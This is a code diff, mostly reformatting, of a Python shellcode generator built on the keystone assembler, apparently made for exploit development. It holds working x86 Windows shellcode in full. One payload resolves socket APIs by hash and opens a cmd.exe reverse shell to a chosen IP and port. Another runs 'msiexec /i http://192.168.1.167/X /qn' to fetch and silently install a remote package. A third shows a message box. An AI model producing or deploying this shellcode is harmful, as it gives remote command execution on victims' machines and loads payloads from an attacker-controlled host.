@@ -1,7 +1,9 @@
 #!/usr/bin/python3
 import sys
 import argparse
-import ctypes, struct, numpy
+import ctypes
+import struct
+import numpy
 import keystone as ks
 
 
@@ -26,22 +28,22 @@ def to_sin_port(port):
 
 
 def ror_str(byte, count):
-	binb = numpy.base_repr(byte, 2).zfill(32)
-	while count > 0:
-		binb = binb[-1] + binb[0:-1]
-		count -= 1
-	return (int(binb, 2))
+    binb = numpy.base_repr(byte, 2).zfill(32)
+    while count > 0:
+        binb = binb[-1] + binb[0:-1]
+        count -= 1
+    return (int(binb, 2))
 
 
 def push_function_hash(function_name):
-	edx = 0x00
-	ror_count = 0
-	for eax in function_name:
-		edx = edx + ord(eax)
-		if ror_count < len(function_name)-1:
-			edx = ror_str(edx, 0xd)
-		ror_count += 1
-	return ("push " + hex(edx))
+    edx = 0x00
+    ror_count = 0
+    for eax in function_name:
+        edx = edx + ord(eax)
+        if ror_count < len(function_name)-1:
+            edx = ror_str(edx, 0xd)
+        ror_count += 1
+    return ("push " + hex(edx))
 
 
 def push_string(input_string):
@@ -55,24 +57,30 @@ def push_string(input_string):
         # add every 4 byte (8 chars) to one push statement
         if ((i != 0) and ((i % 8) == 0)):
             target_bytes = rev_hex_payload[i-8:i]
-            instructions.append(f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};")
+            instructions.append(
+                f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};")
         # handle the left ofer instructions
         elif ((0 == i-1) and ((i % 8) != 0) and rev_hex_payload_len != 8):
             if (rev_hex_payload_len % 8 == 2):
-                first_instructions.append(f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};")
+                first_instructions.append(
+                    f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};")
                 first_instructions.append("push eax;")
             elif (rev_hex_payload_len % 8 == 4):
-                target_bytes = rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]
-                first_instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
+                target_bytes = rev_hex_payload[(
+                    rev_hex_payload_len - (rev_hex_payload_len % 8)):]
+                first_instructions.append(
+                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
                 first_instructions.append("push eax;")
             else:
-                target_bytes = rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]
+                target_bytes = rev_hex_payload[(
+                    rev_hex_payload_len - (rev_hex_payload_len % 8)):]
                 first_instructions.append(f"mov al, 0x{target_bytes[4:6]};")
                 first_instructions.append("push eax;")
-                first_instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
+                first_instructions.append(
+                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
                 first_instructions.append("push ax;")
             null_terminated = True
-            
+
     instructions = first_instructions + instructions
     asm_instructions = "".join(instructions)
     return asm_instructions
@@ -85,105 +93,137 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     push_instr_wsastartup_hash = push_function_hash("WSAStartup")
     push_instr_wsasocketa_hash = push_function_hash("WSASocketA")
     push_instr_wsaconnect_hash = push_function_hash("WSAConnect")
-    
+
     asm = [
         "   start:                               ",
         f"{['', 'int3;'][breakpoint]}            ",
-        "       mov ebp, esp                    ;",  # 
+        "       mov ebp, esp                    ;",  #
         "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
         "   find_kernel32:                       ",
         "       xor ecx,ecx                     ;",  # ECX = 0
         "       mov esi,fs:[ecx+30h]            ;",  # ESI = &(PEB) ([FS:0x30])
         "       mov esi,[esi+0Ch]               ;",  # ESI = PEB->Ldr
-        "       mov esi,[esi+1Ch]               ;",  # ESI = PEB->Ldr.InInitOrder
+        # ESI = PEB->Ldr.InInitOrder
+        "       mov esi,[esi+1Ch]               ;",
         "   next_module:                         ",
-        "       mov ebx, [esi+8h]               ;",  # EBX = InInitOrder[X].base_address
-        "       mov edi, [esi+20h]              ;",  # EDI = InInitOrder[X].module_name
-        "       mov esi, [esi]                  ;",  # ESI = InInitOrder[X].flink (next)
-        "       cmp [edi+12*2], cx              ;",  # (unicode) modulename[12] == 0x00?
+        # EBX = InInitOrder[X].base_address
+        "       mov ebx, [esi+8h]               ;",
+        # EDI = InInitOrder[X].module_name
+        "       mov edi, [esi+20h]              ;",
+        # ESI = InInitOrder[X].flink (next)
+        "       mov esi, [esi]                  ;",
+        # (unicode) modulename[12] == 0x00?
+        "       cmp [edi+12*2], cx              ;",
         "       jne next_module                 ;",  # No: try next module.
         "   find_function_shorten:               ",
         "       jmp find_function_shorten_bnc   ;",  # Short jump
         "   find_function_ret:                   ",
-        "       pop esi                         ;",  # POP the return address from the stack
-        "       mov [ebp+0x04], esi             ;",  # Save find_function address for later usage
-        "       jmp resolve_symbols_kernel32    ;",  # 
+        # POP the return address from the stack
+        "       pop esi                         ;",
+        # Save find_function address for later usage
+        "       mov [ebp+0x04], esi             ;",
+        "       jmp resolve_symbols_kernel32    ;",  #
         "   find_function_shorten_bnc:           ",
         "       call find_function_ret          ;",  # Relative CALL with negative offset
         "   find_function:                       ",
-        "       pushad                          ;",  # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
+        # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
+        "       pushad                          ;",
         "       mov eax, [ebx+0x3c]             ;",  # Offset to PE Signature
-        "       mov edi, [ebx+eax+0x78]         ;",  # Export Table Directory RVA
+        # Export Table Directory RVA
+        "       mov edi, [ebx+eax+0x78]         ;",
         "       add edi, ebx                    ;",  # Export Table Directory VMA
         "       mov ecx, [edi+0x18]             ;",  # NumberOfNames
         "       mov eax, [edi+0x20]             ;",  # AddressOfNames RVA
         "       add eax, ebx                    ;",  # AddressOfNames VMA
-        "       mov [ebp-4], eax                ;",  # Save AddressOfNames VMA for later
+        # Save AddressOfNames VMA for later
+        "       mov [ebp-4], eax                ;",
         "   find_function_loop:                  ",
         "       jecxz find_function_finished    ;",  # Jump to the end if ECX is 0
         "       dec ecx                         ;",  # Decrement our names counter
-        "       mov eax, [ebp-4]                ;",  # Restore AddressOfNames VMA
-        "       mov esi, [eax+ecx*4]            ;",  # Get the RVA of the symbol name
+        # Restore AddressOfNames VMA
+        "       mov eax, [ebp-4]                ;",
+        # Get the RVA of the symbol name
+        "       mov esi, [eax+ecx*4]            ;",
         "       add esi, ebx                    ;",  # Set ESI to the VMA of the current
         "   compute_hash:                        ",
         "       xor eax, eax                    ;",  # NULL EAX
         "       cdq                             ;",  # NULL EDX
         "       cld                             ;",  # Clear direction
         "   compute_hash_again:                  ",
-        "       lodsb                           ;",  # Load the next byte from esi into al
+        # Load the next byte from esi into al
+        "       lodsb                           ;",
         "       test al, al                     ;",  # Check for NULL terminator
-        "       jz compute_hash_finished        ;",  # If the ZF is set, we've hit the NULL term
+        # If the ZF is set, we've hit the NULL term
+        "       jz compute_hash_finished        ;",
         "       ror edx, 0x0d                   ;",  # Rotate edx 13 bits to the right
-        "       add edx, eax                    ;",  # Add the new byte to the accumulator
+        # Add the new byte to the accumulator
+        "       add edx, eax                    ;",
         "       jmp compute_hash_again          ;",  # Next iteration
         "   compute_hash_finished:               ",
         "   find_function_compare:               ",
-        "       cmp edx, [esp+0x24]             ;",  # Compare the computed hash with the requested hash
-        "       jnz find_function_loop          ;",  # If it doesn't match go back to find_function_loop
-        "       mov edx, [edi+0x24]             ;",  # AddressOfNameOrdinals RVA
+        # Compare the computed hash with the requested hash
+        "       cmp edx, [esp+0x24]             ;",
+        # If it doesn't match go back to find_function_loop
+        "       jnz find_function_loop          ;",
+        # AddressOfNameOrdinals RVA
+        "       mov edx, [edi+0x24]             ;",
         "       add edx, ebx                    ;",  # AddressOfNameOrdinals VMA
-        "       mov cx, [edx+2*ecx]             ;",  # Extrapolate the function's ordinal
+        # Extrapolate the function's ordinal
+        "       mov cx, [edx+2*ecx]             ;",
         "       mov edx, [edi+0x1c]             ;",  # AddressOfFunctions RVA
         "       add edx, ebx                    ;",  # AddressOfFunctions VMA
         "       mov eax, [edx+4*ecx]            ;",  # Get the function RVA
         "       add eax, ebx                    ;",  # Get the function VMA
-        "       mov [esp+0x1c], eax             ;",  # Overwrite stack version of eax from pushad
+        # Overwrite stack version of eax from pushad
+        "       mov [esp+0x1c], eax             ;",
         "   find_function_finished:              ",
         "       popad                           ;",  # Restore registers
         "       ret                             ;",  #
         "   resolve_symbols_kernel32:            ",
         push_instr_terminate_hash,                   # TerminateProcess hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x10], eax             ;",  # Save TerminateProcess address for later
+        # Save TerminateProcess address for later
+        "       mov [ebp+0x10], eax             ;",
         push_instr_loadlibrarya_hash,                # LoadLibraryA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA address for later
+        # Save LoadLibraryA address for later
+        "       mov [ebp+0x14], eax             ;",
         push_instr_createprocessa_hash,              # CreateProcessA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x18], eax             ;",  # Save CreateProcessA address for later
+        # Save CreateProcessA address for later
+        "       mov [ebp+0x18], eax             ;",
         "   load_ws2_32:                         ",
         "       xor eax, eax                    ;",  # Null EAX
         "       mov ax, 0x6c6c                  ;",  # Move the end of the string in AX
-        "       push eax                        ;",  # Push EAX on the stack with string NULL terminator
-        "       push 0x642e3233                 ;",  # Push part of the string on the stack
-        "       push 0x5f327377                 ;",  # Push another part of the string on the stack
-        "       push esp                        ;",  # Push ESP to have a pointer to the string
+        # Push EAX on the stack with string NULL terminator
+        "       push eax                        ;",
+        # Push part of the string on the stack
+        "       push 0x642e3233                 ;",
+        # Push another part of the string on the stack
+        "       push 0x5f327377                 ;",
+        # Push ESP to have a pointer to the string
+        "       push esp                        ;",
         "       call dword ptr [ebp+0x14]       ;",  # Call LoadLibraryA
         "   resolve_symbols_ws2_32:              ",
-        "       mov ebx, eax                    ;",  # Move the base address of ws2_32.dll to EBX
+        # Move the base address of ws2_32.dll to EBX
+        "       mov ebx, eax                    ;",
         push_instr_wsastartup_hash,                  # WSAStartup hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x1C], eax             ;",  # Save WSAStartup address for later usage
+        # Save WSAStartup address for later usage
+        "       mov [ebp+0x1C], eax             ;",
         push_instr_wsasocketa_hash,                  # WSASocketA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x20], eax             ;",  # Save WSASocketA address for later usage
+        # Save WSASocketA address for later usage
+        "       mov [ebp+0x20], eax             ;",
         push_instr_wsaconnect_hash, 		     # WSAConnect hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x24], eax             ;",  # Save WSAConnect address for later usage
+        # Save WSAConnect address for later usage
+        "       mov [ebp+0x24], eax             ;",
         "   call_wsastartup:                    ;",
         "       mov eax, esp                    ;",  # Move ESP to EAX
         "       mov cx, 0x590                   ;",  # Move 0x590 to CX
-        "       sub eax, ecx                    ;",  # Substract CX from EAX to avoid overwriting the structure later
+        # Substract CX from EAX to avoid overwriting the structure later
+        "       sub eax, ecx                    ;",
         "       push eax                        ;",  # Push lpWSAData
         "       xor eax, eax                    ;",  # Null EAX
         "       mov ax, 0x0202                  ;",  # Move version to AX
@@ -206,13 +246,17 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "       xor eax, eax                    ;",  # Null EAX
         "       push eax                        ;",  # Push sin_zero[]
         "       push eax                        ;",  # Push sin_zero[]
-        f"      push {to_sin_ip(rev_ip_addr)}   ;",  # Push sin_addr (example: 192.168.2.1)
-        f"      mov ax, {to_sin_port(rev_port)} ;",  # Move the sin_port (example: 443) to AX
+        # Push sin_addr (example: 192.168.2.1)
+        f"      push {to_sin_ip(rev_ip_addr)}   ;",
+        # Move the sin_port (example: 443) to AX
+        f"      mov ax, {to_sin_port(rev_port)} ;",
         "       shl eax, 0x10                   ;",  # Left shift EAX by 0x10 bytes
         "       add ax, 0x02                    ;",  # Add 0x02 (AF_INET) to AX
         "       push eax                        ;",  # Push sin_port & sin_family
-        "       push esp                        ;",  # Push pointer to the sockaddr_in structure
-        "       pop edi                         ;",  # Store pointer to sockaddr_in in EDI
+        # Push pointer to the sockaddr_in structure
+        "       push esp                        ;",
+        # Store pointer to sockaddr_in in EDI
+        "       pop edi                         ;",
         "       xor eax, eax                    ;",  # Null EAX
         "       push eax                        ;",  # Push lpGQOS
         "       push eax                        ;",  # Push lpSQOS
@@ -248,27 +292,34 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "       push eax                        ;",  # Push lpReserved
         "       mov al, 0x44                    ;",  # Move 0x44 to AL
         "       push eax                        ;",  # Push cb
-        "       push esp                        ;",  # Push pointer to the STARTUPINFOA structure
-        "       pop edi                         ;",  # Store pointer to STARTUPINFOA in EDI
+        # Push pointer to the STARTUPINFOA structure
+        "       push esp                        ;",
+        # Store pointer to STARTUPINFOA in EDI
+        "       pop edi                         ;",
         "   create_cmd_string:                   ",
         "       mov eax, 0xff9a879b             ;",  # Move 0xff9a879b into EAX
         "       neg eax                         ;",  # Negate EAX, EAX = 00657865
         "       push eax                        ;",  # Push part of the "cmd.exe" string
-        "       push 0x2e646d63                 ;",  # Push the remainder of the "cmd.exe"
-        "       push esp                        ;",  # Push pointer to the "cmd.exe" string
-        "       pop ebx                         ;",  # Store pointer to the "cmd.exe" string
+        # Push the remainder of the "cmd.exe"
+        "       push 0x2e646d63                 ;",
+        # Push pointer to the "cmd.exe" string
+        "       push esp                        ;",
+        # Store pointer to the "cmd.exe" string
+        "       pop ebx                         ;",
         "   call_createprocessa:                 ",
         "       mov eax, esp                    ;",  # Move ESP to EAX
         "       xor ecx, ecx                    ;",  # Null ECX
         "       mov cx, 0x390                   ;",  # Move 0x390 to CX
-        "       sub eax, ecx                    ;",  # Substract CX from EAX to avoid overwriting the structure later
+        # Substract CX from EAX to avoid overwriting the structure later
+        "       sub eax, ecx                    ;",
         "       push eax                        ;",  # Push lpProcessInformation
         "       push edi                        ;",  # Push lpStartupInfo
         "       xor eax, eax                    ;",  # Null EAX
         "       push eax                        ;",  # Push lpCurrentDirectory
         "       push eax                        ;",  # Push lpEnvironment
         "       push eax                        ;",  # Push dwCreationFlags
-        "       inc eax                         ;",  # Increase EAX, EAX = 0x01 (TRUE)
+        # Increase EAX, EAX = 0x01 (TRUE)
+        "       inc eax                         ;",
         "       push eax                        ;",  # Push bInheritHandles
         "       dec eax                         ;",  # Null EAX
         "       push eax                        ;",  # Push lpThreadAttributes
@@ -305,92 +356,121 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     asm = [
         "   start:                               ",
         f"{['', 'int3;'][breakpoint]}            ",
-        "       mov ebp, esp                    ;",  # 
+        "       mov ebp, esp                    ;",  #
         "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
         "   find_kernel32:                       ",
         "       xor ecx,ecx                     ;",  # ECX = 0
         "       mov esi,fs:[ecx+30h]            ;",  # ESI = &(PEB) ([FS:0x30])
         "       mov esi,[esi+0Ch]               ;",  # ESI = PEB->Ldr
-        "       mov esi,[esi+1Ch]               ;",  # ESI = PEB->Ldr.InInitOrder
+        # ESI = PEB->Ldr.InInitOrder
+        "       mov esi,[esi+1Ch]               ;",
         "   next_module:                         ",
-        "       mov ebx, [esi+8h]               ;",  # EBX = InInitOrder[X].base_address
-        "       mov edi, [esi+20h]              ;",  # EDI = InInitOrder[X].module_name
-        "       mov esi, [esi]                  ;",  # ESI = InInitOrder[X].flink (next)
-        "       cmp [edi+12*2], cx              ;",  # (unicode) modulename[12] == 0x00?
+        # EBX = InInitOrder[X].base_address
+        "       mov ebx, [esi+8h]               ;",
+        # EDI = InInitOrder[X].module_name
+        "       mov edi, [esi+20h]              ;",
+        # ESI = InInitOrder[X].flink (next)
+        "       mov esi, [esi]                  ;",
+        # (unicode) modulename[12] == 0x00?
+        "       cmp [edi+12*2], cx              ;",
         "       jne next_module                 ;",  # No: try next module.
         "   find_function_shorten:               ",
         "       jmp find_function_shorten_bnc   ;",  # Short jump
         "   find_function_ret:                   ",
-        "       pop esi                         ;",  # POP the return address from the stack
-        "       mov [ebp+0x04], esi             ;",  # Save find_function address for later usage
-        "       jmp resolve_symbols_kernel32    ;",  # 
+        # POP the return address from the stack
+        "       pop esi                         ;",
+        # Save find_function address for later usage
+        "       mov [ebp+0x04], esi             ;",
+        "       jmp resolve_symbols_kernel32    ;",  #
         "   find_function_shorten_bnc:           ",
         "       call find_function_ret          ;",  # Relative CALL with negative offset
         "   find_function:                       ",
-        "       pushad                          ;",  # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
+        # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
+        "       pushad                          ;",
         "       mov eax, [ebx+0x3c]             ;",  # Offset to PE Signature
-        "       mov edi, [ebx+eax+0x78]         ;",  # Export Table Directory RVA
+        # Export Table Directory RVA
+        "       mov edi, [ebx+eax+0x78]         ;",
         "       add edi, ebx                    ;",  # Export Table Directory VMA
         "       mov ecx, [edi+0x18]             ;",  # NumberOfNames
         "       mov eax, [edi+0x20]             ;",  # AddressOfNames RVA
         "       add eax, ebx                    ;",  # AddressOfNames VMA
-        "       mov [ebp-4], eax                ;",  # Save AddressOfNames VMA for later
+        # Save AddressOfNames VMA for later
+        "       mov [ebp-4], eax                ;",
         "   find_function_loop:                  ",
         "       jecxz find_function_finished    ;",  # Jump to the end if ECX is 0
         "       dec ecx                         ;",  # Decrement our names counter
-        "       mov eax, [ebp-4]                ;",  # Restore AddressOfNames VMA
-        "       mov esi, [eax+ecx*4]            ;",  # Get the RVA of the symbol name
+        # Restore AddressOfNames VMA
+        "       mov eax, [ebp-4]                ;",
+        # Get the RVA of the symbol name
+        "       mov esi, [eax+ecx*4]            ;",
         "       add esi, ebx                    ;",  # Set ESI to the VMA of the current
         "   compute_hash:                        ",
         "       xor eax, eax                    ;",  # NULL EAX
         "       cdq                             ;",  # NULL EDX
         "       cld                             ;",  # Clear direction
         "   compute_hash_again:                  ",
-        "       lodsb                           ;",  # Load the next byte from esi into al
+        # Load the next byte from esi into al
+        "       lodsb                           ;",
         "       test al, al                     ;",  # Check for NULL terminator
-        "       jz compute_hash_finished        ;",  # If the ZF is set, we've hit the NULL term
+        # If the ZF is set, we've hit the NULL term
+        "       jz compute_hash_finished        ;",
         "       ror edx, 0x0d                   ;",  # Rotate edx 13 bits to the right
-        "       add edx, eax                    ;",  # Add the new byte to the accumulator
+        # Add the new byte to the accumulator
+        "       add edx, eax                    ;",
         "       jmp compute_hash_again          ;",  # Next iteration
         "   compute_hash_finished:               ",
         "   find_function_compare:               ",
-        "       cmp edx, [esp+0x24]             ;",  # Compare the computed hash with the requested hash
-        "       jnz find_function_loop          ;",  # If it doesn't match go back to find_function_loop
-        "       mov edx, [edi+0x24]             ;",  # AddressOfNameOrdinals RVA
+        # Compare the computed hash with the requested hash
+        "       cmp edx, [esp+0x24]             ;",
+        # If it doesn't match go back to find_function_loop
+        "       jnz find_function_loop          ;",
+        # AddressOfNameOrdinals RVA
+        "       mov edx, [edi+0x24]             ;",
         "       add edx, ebx                    ;",  # AddressOfNameOrdinals VMA
-        "       mov cx, [edx+2*ecx]             ;",  # Extrapolate the function's ordinal
+        # Extrapolate the function's ordinal
+        "       mov cx, [edx+2*ecx]             ;",
         "       mov edx, [edi+0x1c]             ;",  # AddressOfFunctions RVA
         "       add edx, ebx                    ;",  # AddressOfFunctions VMA
         "       mov eax, [edx+4*ecx]            ;",  # Get the function RVA
         "       add eax, ebx                    ;",  # Get the function VMA
-        "       mov [esp+0x1c], eax             ;",  # Overwrite stack version of eax from pushad
+        # Overwrite stack version of eax from pushad
+        "       mov [esp+0x1c], eax             ;",
         "   find_function_finished:              ",
         "       popad                           ;",  # Restore registers
-        "       ret                             ;",  # 
+        "       ret                             ;",  #
         "   resolve_symbols_kernel32:            ",
         push_instr_terminate_hash,                   # TerminateProcess hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x10], eax             ;",  # Save TerminateProcess address for later
+        # Save TerminateProcess address for later
+        "       mov [ebp+0x10], eax             ;",
         push_instr_loadlibrarya_hash,                # LoadLibraryA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA address for later
+        # Save LoadLibraryA address for later
+        "       mov [ebp+0x14], eax             ;",
         "   load_msvcrt:                         ",
-        "       xor eax, eax                    ;",  # Null EAX / Push the target library string on the stack --> msvcrt.dll  -->  6d737663 72742e64 6c6c
+        # Null EAX / Push the target library string on the stack --> msvcrt.dll  -->  6d737663 72742e64 6c6c
+        "       xor eax, eax                    ;",
         "       push eax                        ;",  # Push a null byte
         push_instr_msvcrt,                           # Push the msvcrt.dll string
-        "       push esp                        ;",  # Push ESP to have a pointer to the string
+        # Push ESP to have a pointer to the string
+        "       push esp                        ;",
         "       call dword ptr [ebp+0x14]       ;",  # Call LoadLibraryA
         "   resolve_symbols_msvcrt:              ",
-        "       mov ebx, eax                    ;",  # Move the base address of msvcrt.dll to EBX
+        # Move the base address of msvcrt.dll to EBX
+        "       mov ebx, eax                    ;",
         push_instr_system_hash,                      # System hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x18], eax             ;",  # Save System address for later
-        "   call_system:                         ",  # Push the target sting on the stack --> msiexec /i http://192.168.1.167/X /qn   -->  http://string-functions.com/string-hex.aspx
+        # Save System address for later
+        "       mov [ebp+0x18], eax             ;",
+        # Push the target sting on the stack --> msiexec /i http://192.168.1.167/X /qn   -->  http://string-functions.com/string-hex.aspx
+        "   call_system:                         ",
         "       xor eax, eax                    ;",  # Null EAX
         "       push eax                        ;",
         push_instr_msi,
-        "       push esp                        ;",  # Push the pointer to the command on the stack
-        "       call dword ptr [ebp+0x18]       ;",  # Call system (https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-160)
+        # Push the pointer to the command on the stack
+        "       push esp                        ;",
+        # Call system (https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-160)
+        "       call dword ptr [ebp+0x18]       ;",
         "   exec_shellcode:                      ",
         "       xor ecx, ecx                    ;",  # Null ECX
         "       push ecx                        ;",  # uExitCode
@@ -412,101 +492,135 @@ def msg_box(header, text, breakpoint=0):
     asm = [
         "   start:                               ",
         f"{['', 'int3;'][breakpoint]}            ",
-        "       mov ebp, esp                    ;",  # 
+        "       mov ebp, esp                    ;",  #
         "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
         "   find_kernel32:                       ",
         "       xor ecx,ecx                     ;",  # ECX = 0
         "       mov esi,fs:[ecx+30h]            ;",  # ESI = &(PEB) ([FS:0x30])
         "       mov esi,[esi+0Ch]               ;",  # ESI = PEB->Ldr
-        "       mov esi,[esi+1Ch]               ;",  # ESI = PEB->Ldr.InInitOrder
+        # ESI = PEB->Ldr.InInitOrder
+        "       mov esi,[esi+1Ch]               ;",
         "   next_module:                         ",
-        "       mov ebx, [esi+8h]               ;",  # EBX = InInitOrder[X].base_address
-        "       mov edi, [esi+20h]              ;",  # EDI = InInitOrder[X].module_name
-        "       mov esi, [esi]                  ;",  # ESI = InInitOrder[X].flink (next)
-        "       cmp [edi+12*2], cx              ;",  # (unicode) modulename[12] == 0x00?
+        # EBX = InInitOrder[X].base_address
+        "       mov ebx, [esi+8h]               ;",
+        # EDI = InInitOrder[X].module_name
+        "       mov edi, [esi+20h]              ;",
+        # ESI = InInitOrder[X].flink (next)
+        "       mov esi, [esi]                  ;",
+        # (unicode) modulename[12] == 0x00?
+        "       cmp [edi+12*2], cx              ;",
         "       jne next_module                 ;",  # No: try next module.
         "   find_function_shorten:               ",
         "       jmp find_function_shorten_bnc   ;",  # Short jump
         "   find_function_ret:                   ",
-        "       pop esi                         ;",  # POP the return address from the stack
-        "       mov [ebp+0x04], esi             ;",  # Save find_function address for later usage
-        "       jmp resolve_symbols_kernel32    ;",  # 
+        # POP the return address from the stack
+        "       pop esi                         ;",
+        # Save find_function address for later usage
+        "       mov [ebp+0x04], esi             ;",
+        "       jmp resolve_symbols_kernel32    ;",  #
         "   find_function_shorten_bnc:           ",
         "       call find_function_ret          ;",  # Relative CALL with negative offset
         "   find_function:                       ",
-        "       pushad                          ;",  # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
+        # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
+        "       pushad                          ;",
         "       mov eax, [ebx+0x3c]             ;",  # Offset to PE Signature
-        "       mov edi, [ebx+eax+0x78]         ;",  # Export Table Directory RVA
+        # Export Table Directory RVA
+        "       mov edi, [ebx+eax+0x78]         ;",
         "       add edi, ebx                    ;",  # Export Table Directory VMA
         "       mov ecx, [edi+0x18]             ;",  # NumberOfNames
         "       mov eax, [edi+0x20]             ;",  # AddressOfNames RVA
         "       add eax, ebx                    ;",  # AddressOfNames VMA
-        "       mov [ebp-4], eax                ;",  # Save AddressOfNames VMA for later
+        # Save AddressOfNames VMA for later
+        "       mov [ebp-4], eax                ;",
         "   find_function_loop:                  ",
         "       jecxz find_function_finished    ;",  # Jump to the end if ECX is 0
         "       dec ecx                         ;",  # Decrement our names counter
-        "       mov eax, [ebp-4]                ;",  # Restore AddressOfNames VMA
-        "       mov esi, [eax+ecx*4]            ;",  # Get the RVA of the symbol name
+        # Restore AddressOfNames VMA
+        "       mov eax, [ebp-4]                ;",
+        # Get the RVA of the symbol name
+        "       mov esi, [eax+ecx*4]            ;",
         "       add esi, ebx                    ;",  # Set ESI to the VMA of the current
         "   compute_hash:                        ",
         "       xor eax, eax                    ;",  # NULL EAX
         "       cdq                             ;",  # NULL EDX
         "       cld                             ;",  # Clear direction
         "   compute_hash_again:                  ",
-        "       lodsb                           ;",  # Load the next byte from esi into al
+        # Load the next byte from esi into al
+        "       lodsb                           ;",
         "       test al, al                     ;",  # Check for NULL terminator
-        "       jz compute_hash_finished        ;",  # If the ZF is set, we've hit the NULL term
+        # If the ZF is set, we've hit the NULL term
+        "       jz compute_hash_finished        ;",
         "       ror edx, 0x0d                   ;",  # Rotate edx 13 bits to the right
-        "       add edx, eax                    ;",  # Add the new byte to the accumulator
+        # Add the new byte to the accumulator
+        "       add edx, eax                    ;",
         "       jmp compute_hash_again          ;",  # Next iteration
         "   compute_hash_finished:               ",
         "   find_function_compare:               ",
-        "       cmp edx, [esp+0x24]             ;",  # Compare the computed hash with the requested hash
-        "       jnz find_function_loop          ;",  # If it doesn't match go back to find_function_loop
-        "       mov edx, [edi+0x24]             ;",  # AddressOfNameOrdinals RVA
+        # Compare the computed hash with the requested hash
+        "       cmp edx, [esp+0x24]             ;",
+        # If it doesn't match go back to find_function_loop
+        "       jnz find_function_loop          ;",
+        # AddressOfNameOrdinals RVA
+        "       mov edx, [edi+0x24]             ;",
         "       add edx, ebx                    ;",  # AddressOfNameOrdinals VMA
-        "       mov cx, [edx+2*ecx]             ;",  # Extrapolate the function's ordinal
+        # Extrapolate the function's ordinal
+        "       mov cx, [edx+2*ecx]             ;",
         "       mov edx, [edi+0x1c]             ;",  # AddressOfFunctions RVA
         "       add edx, ebx                    ;",  # AddressOfFunctions VMA
         "       mov eax, [edx+4*ecx]            ;",  # Get the function RVA
         "       add eax, ebx                    ;",  # Get the function VMA
-        "       mov [esp+0x1c], eax             ;",  # Overwrite stack version of eax from pushad
+        # Overwrite stack version of eax from pushad
+        "       mov [esp+0x1c], eax             ;",
         "   find_function_finished:              ",
         "       popad                           ;",  # Restore registers
-        "       ret                             ;",  # 
+        "       ret                             ;",  #
         "   resolve_symbols_kernel32:            ",
         push_instr_terminate_hash,                   # TerminateProcess hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x10], eax             ;",  # Save TerminateProcess address for later
+        # Save TerminateProcess address for later
+        "       mov [ebp+0x10], eax             ;",
         push_instr_loadlibrarya_hash,                # LoadLibraryA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA address for later
+        # Save LoadLibraryA address for later
+        "       mov [ebp+0x14], eax             ;",
         "   load_user32:                         ",
-        "       xor eax, eax                    ;",  # Null EAX / Push the target library string on the stack --> user32.dll
+        # Null EAX / Push the target library string on the stack --> user32.dll
+        "       xor eax, eax                    ;",
         "       push eax                        ;",  # Push a null byte
-       push_instr_user32,                              # Push the DLL name
-        "       push esp                        ;",  # Push ESP to have a pointer to the string
+        push_instr_user32,                              # Push the DLL name
+        # Push ESP to have a pointer to the string
+        "       push esp                        ;",
         "       call dword ptr [ebp+0x14]       ;",  # Call LoadLibraryA
         "   resolve_symbols_user32:              ",
-        "       mov ebx, eax                    ;",  # Move the base address of user32.dll to EBX
+        # Move the base address of user32.dll to EBX
+        "       mov ebx, eax                    ;",
         push_instr_msgbox_hash,                      # MessageBoxA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x18], eax             ;",  # Save MessageBoxA address for later
-        "   call_system:                         ",  # Push the target stings on the stack (https://www.fuzzysecurity.com/tutorials/expDev/6.html)
+        # Save MessageBoxA address for later
+        "       mov [ebp+0x18], eax             ;",
+        # Push the target stings on the stack (https://www.fuzzysecurity.com/tutorials/expDev/6.html)
+        "   call_system:                         ",
         "       xor eax, eax                    ;",  # Null EAX
         "       push eax                        ;",  # Create a null byte on the stack
